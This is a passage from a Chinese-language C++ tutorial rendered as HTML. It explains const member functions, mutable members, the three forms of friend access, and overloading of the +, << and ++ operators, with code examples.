class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-3-4-const修饰成员函数"><a href="#4-3-4-const修饰成员函数" class="headerlink" title="4.3.4 const修饰成员函数"></a>4.3.4 const修饰成员函数</h4><p><strong>常函数：</strong></p><ul><li>成员函数后加const后我们称为这个函数为<strong>常函数</strong></li><li>常函数内不可以修改成员属性</li><li>成员属性声明时加关键字mutable后，在常函数中依然可以修改</li></ul><p><strong>常对象：</strong></p><ul><li>声明对象前加const称该对象为常对象</li><li>常对象只能调用常函数</li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>() &#123;<br>m_A = <span class="hljs-number">0</span>;<br>m_B = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//this指针的本质是一个指针常量，指针的指向不可修改</span><br><span class="hljs-comment">//如果想让指针指向的值也不可以修改，需要声明常函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShowPerson</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br><span class="hljs-comment">//const Type* const pointer;</span><br><span class="hljs-comment">//this = NULL; //不能修改指针的指向 Person* const this;</span><br><span class="hljs-comment">//this-&gt;mA = 100; //但是this指针指向的对象的数据是可以修改的</span><br><br><span class="hljs-comment">//const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量</span><br><span class="hljs-keyword">this</span>-&gt;m_B = <span class="hljs-number">100</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyFunc</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br><span class="hljs-comment">//mA = 10000;</span><br>&#125;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br><span class="hljs-keyword">mutable</span> <span class="hljs-type">int</span> m_B; <span class="hljs-comment">//可修改 可变的</span><br>&#125;;<br><br><br><span class="hljs-comment">//const修饰对象  常对象</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">const</span> Person person; <span class="hljs-comment">//常量对象  </span><br>cout &lt;&lt; person.m_A &lt;&lt; endl;<br><span class="hljs-comment">//person.mA = 100; //常对象不能修改成员变量的值,但是可以访问</span><br>person.m_B = <span class="hljs-number">100</span>; <span class="hljs-comment">//但是常对象可以修改mutable修饰成员变量</span><br><br><span class="hljs-comment">//常对象访问成员函数</span><br>person.<span class="hljs-built_in">MyFunc</span>(); <span class="hljs-comment">//常对象不能调用const的函数</span><br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-4-友元"><a href="#4-4-友元" class="headerlink" title="4.4 友元"></a>4.4 友元</h3><p>生活中你的家有客厅(Public)，有你的卧室(Private)</p><p>客厅所有来的客人都可以进去，但是你的卧室是私有的，也就是说只有你能进去</p><p>但是呢，你也可以允许你的好闺蜜好基友进去。</p><p>在程序里，有些私有属性 也想让类外特殊的一些函数或者类进行访问，就需要用到友元的技术</p><p>友元的目的就是让一个函数或者类 访问另一个类中私有成员</p><p>友元的关键字为  <strong>friend</strong></p><p>友元的三种实现</p><ul><li>全局函数做友元</li><li>类做友元</li><li>成员函数做友元</li></ul><h4 id="4-4-1-全局函数做友元"><a href="#4-4-1-全局函数做友元" class="headerlink" title="4.4.1 全局函数做友元"></a>4.4.1 全局函数做友元</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Building</span><br>&#123;<br><span class="hljs-comment">//告诉编译器 goodGay全局函数 是 Building类的好朋友，可以访问类中的私有内容</span><br><span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">goodGay</span><span class="hljs-params">(Building * building)</span></span>;<br><br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-built_in">Building</span>()<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_SittingRoom = <span class="hljs-string">&quot;客厅&quot;</span>;<br><span class="hljs-keyword">this</span>-&gt;m_BedRoom = <span class="hljs-string">&quot;卧室&quot;</span>;<br>&#125;<br><br><br><span class="hljs-keyword">public</span>:<br>string m_SittingRoom; <span class="hljs-comment">//客厅</span><br><br><span class="hljs-keyword">private</span>:<br>string m_BedRoom; <span class="hljs-comment">//卧室</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">goodGay</span><span class="hljs-params">(Building * building)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>Building b;<br><span class="hljs-built_in">goodGay</span>(&amp;b);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-2-类做友元"><a href="#4-4-2-类做友元" class="headerlink" title="4.4.2 类做友元"></a>4.4.2 类做友元</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Building</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">goodGay</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-built_in">goodGay</span>();<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>Building *building;<br>&#125;;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Building</span><br>&#123;<br><span class="hljs-comment">//告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容</span><br><span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">goodGay</span>;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Building</span>();<br><br><span class="hljs-keyword">public</span>:<br>string m_SittingRoom; <span class="hljs-comment">//客厅</span><br><span class="hljs-keyword">private</span>:<br>string m_BedRoom;<span class="hljs-comment">//卧室</span><br>&#125;;<br><br>Building::<span class="hljs-built_in">Building</span>()<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_SittingRoom = <span class="hljs-string">&quot;客厅&quot;</span>;<br><span class="hljs-keyword">this</span>-&gt;m_BedRoom = <span class="hljs-string">&quot;卧室&quot;</span>;<br>&#125;<br><br>goodGay::<span class="hljs-built_in">goodGay</span>()<br>&#123;<br>building = <span class="hljs-keyword">new</span> Building;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">goodGay::visit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>goodGay gg;<br>gg.<span class="hljs-built_in">visit</span>();<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-4-3-成员函数做友元"><a href="#4-4-3-成员函数做友元" class="headerlink" title="4.4.3 成员函数做友元"></a>4.4.3 成员函数做友元</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Building</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">goodGay</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-built_in">goodGay</span>();<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//只让visit函数作为Building的好朋友，可以发访问Building中私有内容</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">visit2</span><span class="hljs-params">()</span></span>; <br><br><span class="hljs-keyword">private</span>:<br>Building *building;<br>&#125;;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Building</span><br>&#123;<br><span class="hljs-comment">//告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容</span><br><span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-type">void</span> <span class="hljs-title">goodGay::visit</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Building</span>();<br><br><span class="hljs-keyword">public</span>:<br>string m_SittingRoom; <span class="hljs-comment">//客厅</span><br><span class="hljs-keyword">private</span>:<br>string m_BedRoom;<span class="hljs-comment">//卧室</span><br>&#125;;<br><br>Building::<span class="hljs-built_in">Building</span>()<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_SittingRoom = <span class="hljs-string">&quot;客厅&quot;</span>;<br><span class="hljs-keyword">this</span>-&gt;m_BedRoom = <span class="hljs-string">&quot;卧室&quot;</span>;<br>&#125;<br><br>goodGay::<span class="hljs-built_in">goodGay</span>()<br>&#123;<br>building = <span class="hljs-keyword">new</span> Building;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">goodGay::visit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">goodGay::visit2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;<br><span class="hljs-comment">//cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>goodGay  gg;<br>gg.<span class="hljs-built_in">visit</span>();<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <br><span class="hljs-built_in">test01</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-5-运算符重载"><a href="#4-5-运算符重载" class="headerlink" title="4.5 运算符重载"></a>4.5 运算符重载</h3><p>运算符重载概念：对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p><h4 id="4-5-1-加号运算符重载"><a href="#4-5-1-加号运算符重载" class="headerlink" title="4.5.1 加号运算符重载"></a>4.5.1 加号运算符重载</h4><p>作用：实现两个自定义数据类型相加的运算</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>() &#123;&#125;;<br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_A = a;<br><span class="hljs-keyword">this</span>-&gt;m_B = b;<br>&#125;<br><span class="hljs-comment">//成员函数实现 + 号运算符重载</span><br>Person <span class="hljs-keyword">operator</span>+(<span class="hljs-type">const</span> Person&amp; p) &#123;<br>Person temp;<br>temp.m_A = <span class="hljs-keyword">this</span>-&gt;m_A + p.m_A;<br>temp.m_B = <span class="hljs-keyword">this</span>-&gt;m_B + p.m_B;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> m_A;<br><span class="hljs-type">int</span> m_B;<br>&#125;;<br><br><span class="hljs-comment">//全局函数实现 + 号运算符重载</span><br><span class="hljs-comment">//Person operator+(const Person&amp; p1, const Person&amp; p2) &#123;</span><br><span class="hljs-comment">//Person temp(0, 0);</span><br><span class="hljs-comment">//temp.m_A = p1.m_A + p2.m_A;</span><br><span class="hljs-comment">//temp.m_B = p1.m_B + p2.m_B;</span><br><span class="hljs-comment">//return temp;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//运算符重载 可以发生函数重载 </span><br>Person <span class="hljs-keyword">operator</span>+(<span class="hljs-type">const</span> Person&amp; p2, <span class="hljs-type">int</span> val)  <br>&#123;<br>Person temp;<br>temp.m_A = p<span class="hljs-number">2.</span>m_A + val;<br>temp.m_B = p<span class="hljs-number">2.</span>m_B + val;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>)</span></span>;<br><span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>)</span></span>;<br><br><span class="hljs-comment">//成员函数方式</span><br>Person p3 = p2 + p1;  <span class="hljs-comment">//相当于 p2.operaor+(p1)</span><br>cout &lt;&lt; <span class="hljs-string">&quot;mA:&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>m_A &lt;&lt; <span class="hljs-string">&quot; mB:&quot;</span> &lt;&lt; p<span class="hljs-number">3.</span>m_B &lt;&lt; endl;<br><br><br>Person p4 = p3 + <span class="hljs-number">10</span>; <span class="hljs-comment">//相当于 operator+(p3,10)</span><br>cout &lt;&lt; <span class="hljs-string">&quot;mA:&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>m_A &lt;&lt; <span class="hljs-string">&quot; mB:&quot;</span> &lt;&lt; p<span class="hljs-number">4.</span>m_B &lt;&lt; endl;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结1：对于内置的数据类型的表达式的的运算符是不可能改变的</p></blockquote><blockquote><p>总结2：不要滥用运算符重载</p></blockquote><h4 id="4-5-2-左移运算符重载"><a href="#4-5-2-左移运算符重载" class="headerlink" title="4.5.2 左移运算符重载"></a>4.5.2 左移运算符重载</h4><p>作用：可以输出自定义数据类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><span class="hljs-keyword">friend</span> ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; out, Person&amp; p);<br><br><span class="hljs-keyword">public</span>:<br><br><span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)<br>&#123;<br><span class="hljs-keyword">this</span>-&gt;m_A = a;<br><span class="hljs-keyword">this</span>-&gt;m_B = b;<br>&#125;<br><br><span class="hljs-comment">//成员函数 实现不了  p &lt;&lt; cout 不是我们想要的效果</span><br><span class="hljs-comment">//void operator&lt;&lt;(Person&amp; p)&#123;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_A;<br><span class="hljs-type">int</span> m_B;<br>&#125;;<br><br><span class="hljs-comment">//全局函数实现左移重载</span><br><span class="hljs-comment">//ostream对象只能有一个</span><br>ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; out, Person&amp; p) &#123;<br>out &lt;&lt; <span class="hljs-string">&quot;a:&quot;</span> &lt;&lt; p.m_A &lt;&lt; <span class="hljs-string">&quot; b:&quot;</span> &lt;&lt; p.m_B;<br><span class="hljs-keyword">return</span> out;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>)</span></span>;<br><br>cout &lt;&lt; p1 &lt;&lt; <span class="hljs-string">&quot;hello world&quot;</span> &lt;&lt; endl; <span class="hljs-comment">//链式编程</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-built_in">test</span>();<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>总结：重载左移运算符配合友元可以实现输出自定义数据类型</p></blockquote><h4 id="4-5-3-递增运算符重载"><a href="#4-5-3-递增运算符重载" class="headerlink" title="4.5.3 递增运算符重载"></a>4.5.3 递增运算符重载</h4><p>作用： 通过重载递增运算符，实现自己的整型数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyInteger</span> &#123;<br><br><span class="hljs-keyword">friend</span> ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint);<br><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">MyInteger</span>() &#123;<br>m_Num = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//前置++</span><br>MyInteger&amp; <span class="hljs-keyword">operator</span>++() &#123;<br><span class="hljs-comment">//先++</span><br>m_Num++;<br><span class="hljs-comment">//再返回</span><br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><br><span class="hljs-comment">//后置++</span><br>MyInteger <span class="hljs-keyword">operator</span>++(<span class="hljs-type">int</span>) &#123;<br><span class="hljs-comment">//先返回</span><br>MyInteger temp = *<span class="hljs-keyword">this</span>; <span class="hljs-comment">//记录当前本身的值，然后让本身的值加1，但是返回的是以前的值，达到先返回后++；</span><br>m_Num++;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-type">int</span> m_Num;<br>&#125;;<br><br><br>ostream&amp; <span class="hljs-keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;<br>out &lt;&lt; myint.m_Num;<br><span class="hljs-keyword">return</span> out;<br>&#125;<br><br><br><span class="hljs-comment">//前置++ 先++ 再返回</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span>&#123;<br>MyInteger myInt;<br>cout &lt;&lt; ++myInt &lt;&lt; endl;<br>cout &lt;&lt; myInt &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-comment">//后置++ 先返回 再++</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span> </span>&#123;<br><br>MyInteger myInt;<br>cout &lt;&lt; myInt++ &lt;&lt; endl;<br>cout &lt;&lt; myInt &lt;&lt; endl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span 